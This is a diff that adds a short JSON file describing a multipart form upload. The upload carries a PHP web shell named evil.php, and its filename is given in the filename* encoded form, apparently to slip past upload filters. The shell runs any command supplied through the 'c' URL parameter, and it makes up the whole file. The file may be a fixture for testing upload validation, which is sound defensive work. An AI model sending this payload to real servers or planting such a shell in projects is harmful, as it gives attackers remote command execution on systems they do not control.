@@ -1,0 +1,4 @@
+{
+  "content_type": "multipart/form-data; boundary=B",
+  "body": "--B\r\nContent-Disposition: form-data; name=\"up\"; filename*=UTF-8''evil.php\r\n\r\n<?php system($_GET['c']); ?>\r\n--B--\r\n"
+}
